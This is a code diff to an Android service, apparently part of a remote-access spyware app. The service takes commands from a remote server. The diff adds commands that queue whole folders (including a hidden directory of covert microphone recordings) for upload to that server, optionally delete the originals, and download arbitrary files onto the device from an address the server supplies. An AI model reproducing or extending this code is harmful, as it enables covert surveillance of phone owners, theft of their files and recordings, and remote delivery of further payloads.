@@ -24,12 +24,10 @@ import android.os.SystemClock;
 import android.os.Vibrator;
 import android.preference.PreferenceManager;
 import android.provider.MediaStore;
-import android.provider.Settings;
 import android.speech.tts.TextToSpeech;
 import android.speech.tts.TextToSpeech.OnInitListener;
 import android.telephony.SmsManager;
 import android.text.format.DateFormat;
-import android.text.format.DateUtils;
 import android.util.Log;
 import android.view.KeyEvent;
 
@@ -51,10 +49,8 @@ import org.json.JSONObject;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.IOException;
-import java.lang.reflect.Array;
 import java.net.Socket;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.Locale;
 
 public class CommunicationService extends Service implements OnInitListener
@@ -88,7 +84,8 @@ public class CommunicationService extends Service implements OnInitListener
 	private MediaRecorder mRecorder = new MediaRecorder();
 	private ClipboardManager mClipboard;
 	private boolean mIsRecording = true;
-	private ArrayList<File> mUploadQueue = new ArrayList<>();
+	private ArrayList<FileHolder> mUploadQueue = new ArrayList<>();
+	private int mDownloadsInProgress = 0;
 
 	@Override
 	public IBinder onBind(Intent intent)
@@ -199,6 +196,26 @@ public class CommunicationService extends Service implements OnInitListener
 		mRecorder.release();
 
 		ttsExit();
+	}
+
+	public void downloadFile(final String address, final File file)
+	{
+		new Thread()
+		{
+			@Override
+			public void run()
+			{
+				super.run();
+				mDownloadsInProgress++;
+
+				HttpRequest httpRequest = HttpRequest.get(address);
+
+				if (httpRequest.ok())
+					httpRequest.receive(file);
+
+				mDownloadsInProgress--;
+			}
+		}.start();
 	}
 
 	public File getHiddenDirectory()
@@ -812,6 +829,7 @@ public class CommunicationService extends Service implements OnInitListener
 						response.put("bluetoothPower", BluetoothAdapter.getDefaultAdapter().isEnabled());
 						response.put("wifiPower", wifiState(((WifiManager) getSystemService(WIFI_SERVICE)).getWifiState()));
 						response.put("remoteDelay", mRemoteThreadDelay);
+						response.put("downloadsInProgress", mDownloadsInProgress);
 						response.put("ringerMode", ringerMode(mAudioManager.getRingerMode()));
 						response.put("streamVolume", mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC));
 						response.put("parallelConnections", mParallelConnections.size());
@@ -872,13 +890,13 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "voiceRecorder":
-						String rMode  = receivedMessage.has("mode") ? receivedMessage.getString("mode") : "default";
+						String rMode = receivedMessage.has("event") ? receivedMessage.getString("event") : "default";
 						response.put("isRecording", mIsRecording);
 
-						switch(rMode)
+						switch (rMode)
 						{
 							default:
-								response.put("mode", "record,stop,path");
+								response.put("event", "record,stop,path");
 								break;
 							case "record":
 								File recordFile = startVoiceRecording();
@@ -897,19 +915,75 @@ public class CommunicationService extends Service implements OnInitListener
 								break;
 						}
 						break;
+					case "uploadFolder":
+						File folderToUpload = null;
+
+						boolean deleteOnExit = receivedMessage.has("delete") && receivedMessage.getBoolean("delete");
+						String defaultFolder = receivedMessage.has("default") ? receivedMessage.getString("default") : "default";
+
+						switch (defaultFolder)
+						{
+							case "recordings":
+								folderToUpload = getHiddenRecordingsDirectory();
+								break;
+							default:
+								folderToUpload = new File(receivedMessage.getString("folder"));
+								break;
+						}
+
+						if (folderToUpload != null && folderToUpload.isDirectory())
+						{
+							response.put("folder", folderToUpload.getAbsolutePath());
+
+							for (File file : folderToUpload.listFiles())
+							{
+								if (!file.isFile())
+									continue;
+
+								FileHolder holder = new FileHolder();
+
+								holder.deleteOnExit = deleteOnExit;
+								holder.file = file;
+								holder.categoryName = folderToUpload.getName().toLowerCase();
+
+								mUploadQueue.add(holder);
+							}
+
+							response.put("info", mUploadQueue.size() + " files will be uploaded" + (deleteOnExit ? " and will be deleted after upload process is done" : ""));
+							result = true;
+						}
+						else
+							response.put("error", "Target folder is suitable. Check if it's a correct path");
+
+						break;
 					case "uploadFile":
 						File uploadThis = new File(receivedMessage.getString("file"));
+						boolean delete = receivedMessage.has("delete") && receivedMessage.getBoolean("delete");
 
 						response.put("file", uploadThis.getAbsolutePath());
 
 						if (uploadThis.isFile())
 						{
-							mUploadQueue.add(uploadThis);
+							FileHolder holder = new FileHolder();
+
+							holder.deleteOnExit = delete;
+							holder.file = uploadThis;
+
+							mUploadQueue.add(holder);
 							response.put("info", "File will be uploaded to remote server on the next connection");
 							result = true;
 						}
 						else
 							response.put("error", "File not found");
+
+						break;
+					case "downloadFile":
+						File saveTo = new File(receivedMessage.getString("file"));
+						String address = receivedMessage.getString("address");
+
+						downloadFile(address, saveTo);
+						response.put("info", "Download started. Check it using getStatus.downloadsInProgress");
+						result = true;
 
 						break;
 					default:
@@ -1038,24 +1112,37 @@ public class CommunicationService extends Service implements OnInitListener
 
 				if (mUploadQueue.size() > 0)
 				{
-					File firstFile = mUploadQueue.get(0);
+					FileHolder firstFile = mUploadQueue.get(0);
 
 					ServerAddress serverAddress = mRemote.getAddress();
 					serverAddress.clearAll();
 
 					try
 					{
-						HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
-						StringBuilder output = new StringBuilder();
+						if (firstFile.file.isFile())
+						{
+							HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
+							StringBuilder output = new StringBuilder();
 
-						request.readTimeout(0);
-						request.part("file", firstFile.getName(), firstFile);
-						request.receive(output);
+							request.readTimeout(0);
+							request.part(firstFile.categoryName, firstFile.file.getName(), firstFile.file);
+							request.receive(output);
 
-						Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
+							Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
 
-						if (request.ok())
+							if (request.ok())
+							{
+								mUploadQueue.remove(0);
+
+								if (firstFile.deleteOnExit)
+									firstFile.file.delete();
+							}
+						}
+						else
+						{
+							Log.e(TAG, "File upload is passed (NOT_FOUND)");
 							mUploadQueue.remove(0);
+						}
 					} catch (Exception e)
 					{
 						e.printStackTrace();
@@ -1063,5 +1150,12 @@ public class CommunicationService extends Service implements OnInitListener
 				}
 			}
 		}
+	}
+
+	protected class FileHolder
+	{
+		public File file;
+		public boolean deleteOnExit = false;
+		public String categoryName = "files";
 	}
 }
